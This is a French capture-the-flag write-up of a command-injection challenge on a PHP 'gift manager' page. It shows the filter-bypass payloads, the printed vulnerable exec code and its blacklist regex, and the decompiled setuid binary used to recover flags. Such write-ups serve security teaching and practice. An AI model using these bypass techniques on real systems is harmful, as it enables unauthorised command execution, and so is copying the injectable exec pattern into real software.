J'ai modifié le champ command dans burpsuite. J'ai rapidement vu que certains caractères sont illégaux:
```/( |\?|<|>|;|:|&|\*|\(|\)|\{|\}|\$|\^|`|'|"|\.|s|a|n|t|a|a|n|d|e|l|v|e|s|b|e|l|i|e|v|e|i|n|y|o|u)/i```

Il existe les class caracters de regex qui ne sont pas filtrés en autant que les lettres de la phrase suivantes n'y appraissent pas:
santa and elves belive in you
et quelques autres caractères spéciaux sont absents de la string command (dont un espace).

J'ai vu que le code 126 indique que la commande spécifié existe mais ne s'est pas correctement exécuté, 127 indique qu'aucune commande existe et 0 est qu'elle s'est exécuté sans problème

Pour remplacer l'espace j'utilise la tabulation (soit %09 en uri encoded)
Donc si je modifie la commande pour:

équivalent à /bin/cat   make.php
```%2F[_-c][h-j][m-p]%2Fc[_-c][r-w]%09m[_-c]k[c-f][--0]php```

ou alors 

/bin/base64   make.php
```%2F[_-c][h-j][m-p]%2F[_-c][_-c][r-w][c-f]64%09m[_-c]k[c-f][--0]php```

voilà le résultat:
```php
<?php 
    putenv('PATH=/');
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>H0H0H0</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/carousel/">

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="css/carousel.css" rel="stylesheet">
  </head>
  <body>

    <header>
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand" href="#">Santa Claus Gift Manager</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="index.php">Home <span class="sr-only"></span></a>
            </li>
            <li class="nav-item active">
              <a class="nav-link" href="make.php">Make a gift <span class="sr-only">(current)</span></a>
            </li>
        </div>
      </nav>
    </header>

    <main role="main">
      <section class="jumbotron text-center">
        <div class="container">
          <h1 class="jumbotron-heading">Make a gift</h1>
          <p class="lead text-muted">The <span class="font-weight-bold">glob</span>ins can make you a gift if you have the right <del>pattern</del> promotion code.</p>
          <p>
              <form action="/make.php" method="POST">
                <select name="command">
                    <option value="/h0h0h0/mkgf">Make a gift</option>
                </select>
                <input type="submit" value="submit">
            </form>
            <pre><?php 
            $pattern = '/( |\?|<|>|;|:|&|\*|\(|\)|\{|\}|\$|\^|`|\'|"|\.|s|a|n|t|a|a|n|d|e|l|v|e|s|b|e|l|i|e|v|e|i|n|y|o|u)/i';
            if(isset($_POST["command"])){
              if(!preg_match($pattern, $_POST['command'])){
                  $ret;
                  $reta=array(); 
                  exec("/bin/sh -c '".$_POST["command"]. "'", $reta, $ret); 
                  echo $ret."\n";
                  ?><div class="alert alert-success" role="alert">Command sent successfully<hr><?php  
                  foreach ($reta as $key => $value) {
                      echo $value . "\n";?></div><?php     
                  } 
              } else {
                  ?><div class="alert alert-danger" role="alert">Restricted characters detected.<hr><?php echo $pattern; ?></div><?php
              }
            }
            ?>
            </pre>
          </p>
        </div>
      </section>
      <!-- FOOTER -->
      <footer class="container">
        <p class="float-right"><a href="#">Back to top</a></p>
        <p>RingZer0 Team Special Edition - Montré-hack</p>
      </footer>
    </main>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="js/vendor/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="js/holder.min.js"></script>
  </body>
</html>
```

Rien d'étonnant pour l'instant on avait déduit le comportement du script php.

/usr/bin/ls    /var/www/html
```%2F[r-w][r-w]r%2F[_-c][h-j][m-p]%2F[k-m][r-w]%09%2F[r-w][_-c]r%2Fwww%2Fh[r-w][m-p][k-m]```
Ca affiche
/var/www/html: css gift.txt images index.php js make.php

mais gift.txt n'est pas accessible

ls /
```%2F[_-c][h-j][m-p]%2F[k-m][r-w]%09%2F```
```/: bin boot dev etc flag.txt h0h0h0 home lib lib32 lib64 libx32 media mnt opt proc root run sbin snap srv sys tmp usr var```

On a flag.txt ici dans /

cat /flag.txt
```%2F[_-c][h-j][m-p]%2Fc[_-c][r-w]%09%2Ff[k-m][_-c]g[--0][r-w]x[r-w]```

FLAG-94103323df8b33e0bb6b5c26c7dab40d

Ca semble être le flag du premier challenge ...

Si je regarde le fichier mkgf 
```command=%2F[r-w][r-w]r%2F[_-c][h-j][m-p]%2Ff[h-j][k-m][c-f]%09%2Fh0h0h0%2Fmkgf```
/h0h0h0/mkgf: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=991a720b563ea9551e34e7ad58e9b1ec8a7aa455, stripped


On peut regarder a quoi ressemble le script via base64
```%2F[_-c][h-j][m-p]%2F[_-c][_-c][r-w][c-f]64%09%2Fh0h0h0%2Fmkgf```

Je le reconstitue ainsi localement pour le dé-assembler l'exécutable.

Décompilation via binary ninja:
```c
void _init()
{
    if (__gmon_start__)
        __gmon_start__();
}

int64_t sub_680()
{
    int64_t var_8 = 0;
    /* jump -> nullptr */
}

int32_t puts(char const* str)
{
    /* tailcall */
    return puts(str);
}

int64_t sub_696()
{
    int64_t var_8 = 0;
    /* tailcall */
    return sub_680();
}

uint64_t strlen(char const* arg1)
{
    /* tailcall */
    return strlen(arg1);
}

int64_t sub_6a6()
{
    int64_t var_8 = 1;
    /* tailcall */
    return sub_680();
}

void __stack_chk_fail() __noreturn
{
    /* tailcall */
    return __stack_chk_fail();
}

int64_t sub_6b6()
{
    int64_t var_8 = 2;
    /* tailcall */
    return sub_680();
}

int32_t printf(char const* format, ...)
{
    /* tailcall */
    return printf();
}

int64_t sub_6c6()
{
    int64_t var_8 = 3;
    /* tailcall */
    return sub_680();
}

int64_t memset(void* arg1, int32_t arg2, uint64_t arg3)
{
    /* tailcall */
    return memset(arg1, arg2, arg3);
}

int64_t sub_6d6()
{
    int64_t var_8 = 4;
    /* tailcall */
    return sub_680();
}

ssize_t read(int32_t fd, void* buf, uint64_t nbytes)
{
    /* tailcall */
    return read(fd, buf, nbytes);
}

int64_t sub_6e6()
{
    int64_t var_8 = 5;
    /* tailcall */
    return sub_680();
}

int32_t open(char const* file, int32_t oflag, ...)
{
    /* tailcall */
    return open();
}

int64_t sub_6f6()
{
    int64_t var_8 = 6;
    /* tailcall */
    return sub_680();
}

void __cxa_finalize(void* d)
{
    /* tailcall */
    return __cxa_finalize(d);
}

void _start(int64_t arg1, int64_t arg2, void (* arg3)()) __noreturn
{
    int64_t stack_end_1;
    int64_t stack_end = stack_end_1;
    __libc_start_main(main, __return_addr, &ubp_av, init, fini, arg3, &stack_end);
    /* no return */
}

void deregister_tm_clones()
{
    return;
}

void register_tm_clones()
{
    return;
}

void _FINI_0()
{
    if (data_201010)
        return;
    
    if (__cxa_finalize)
        __cxa_finalize(data_201008);
    
    deregister_tm_clones();
    data_201010 = 1;
}

void _INIT_0()
{
    /* tailcall */
    return register_tm_clones();
}

int64_t sub_81a(char* arg1)
{
    if (strlen(arg1) == 4)
    {
        int32_t var_20_1 = 0;
        int32_t var_1c_1 = 0;
        
        while (var_1c_1 < strlen(arg1))
        {
            var_20_1 = ((var_20_1 << 1) + arg1[var_1c_1]) << 1 ^ 0x6830;
            var_1c_1 += 1;
        }
        
        if (var_20_1 == 0x1d64da)
            return 1;
    }
    
    return 0;
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    
    if (argc > 1)
    {
        if (!sub_81a(argv[1]))
            puts("Invalid promo code");
        else
        {
            void buf;
            memset(&buf, 0, 0x30);
            read(open("gift.txt", 0), &buf, 0x25);
            printf("Here is your gift: %s\n", &buf);
        }
    }
    else
        puts("Promo code needed to get a gift");
    
    if (rax == *(fsbase + 0x28))
        return 0;
    
    __stack_chk_fail();
    /* no return */
}

void init()
{
    _init();
    int64_t i = 0;
    
    do
    {
        int64_t rdx;
        int64_t rsi;
        int32_t rdi;
        (&init_array)[i](rdi, rsi, rdx);
        i += 1;
    } while (1 != i);
}

void fini() __pure
{
    return;
}

int64_t _fini() __pure
{
    return;
}
```

La fonction sub_81a permet de reconstituer l'argument.
```pseudo
h = 0
pour chaque caractère c du code (4 caractères) :
    h = ((h*2 + c) * 2) XOR 0x6830
condition : h final == 0x1d64da
```
Je n'ai qu'à bruteforce 4 caractères jusqu'à obtenir 0x1d64da, je trouve ainsi !k1!

command=%2Fh0h0h0%2Fmkgf%09!k1!

FLAG-7af569dd25c74ae6b12aa3feeaab861a